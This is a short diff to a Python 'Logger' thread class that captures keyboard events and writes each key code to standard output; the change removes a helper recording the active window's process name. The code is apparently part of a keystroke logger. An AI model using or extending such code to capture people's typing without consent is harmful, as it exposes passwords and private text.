@@ -48,7 +48,6 @@ class Logger(threading.Thread):
     def process_event(self):
         try:
             event = self.q.get(timeout=0.05)
-            process_name = self.get_process_name(event)
             self.ek = event.Key + '\n'
             p = Process(target=self.write_keycode)
             p.start()
@@ -62,9 +61,6 @@ class Logger(threading.Thread):
 
     def write_keycode(self):
         sys.stdout.write(self.ek)
-
-    def get_process_name(self, event):
-        return event.WindowProcName
 
     def get_username(self):
         return os.getenv('USER')
